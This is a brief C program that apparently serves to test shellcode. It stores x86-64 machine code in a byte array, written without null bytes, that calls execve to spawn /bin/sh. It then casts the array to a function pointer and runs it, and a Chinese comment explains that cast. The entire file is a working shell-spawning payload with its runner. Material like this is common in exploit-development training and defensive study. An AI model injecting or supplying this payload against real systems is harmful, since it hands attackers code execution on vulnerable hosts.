#include<stdio.h>  
#include<string.h>  
  
unsigned char code[] = "\xeb\x1f\x48\x31\xc0\x5b\x88\x43\x07\x48\x89\x5b\x08\x48\x89\x43\x10\x6a\x3b\x58\x48\x8d\x3b\x48\x8d\x73\x08\x48\x8d\x53\x10\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x30\x61\x61\x61\x61\x61\x61\x61\x61\x62\x62\x62\x62\x62\x62\x62\x62";  
  
int main()  
{  
  
printf("Shellcode Length:  %d\n", (int)strlen(code));  
  
int (*ret)() = (int(*)())code;//声明一个函数指针  将code数组的地址转换同一类型的指针并赋值  
  
ret();  
  
}
